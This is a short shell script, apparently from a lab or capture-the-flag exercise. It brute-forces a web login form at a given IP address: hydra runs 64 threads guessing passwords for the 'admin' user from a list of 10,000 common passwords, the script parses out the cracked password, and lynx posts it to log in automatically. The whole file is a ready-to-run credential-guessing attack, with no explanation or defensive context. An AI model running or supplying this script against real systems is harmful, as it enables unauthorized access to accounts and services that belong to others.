ip_address=$1
hydra $ip_address -s 80 -l admin -P 10k-most-common.txt -t 64 -T 64 http-post-form '/:username=^USER^&password=^PASS^&submit=Submit:failed' | grep ': [a-z]' | cut -c 66- > a.txt
password=$(cat a.txt | tr -d '\n')
echo 'username=admin&password='$password | lynx $ip_address -post_data
rm a.txt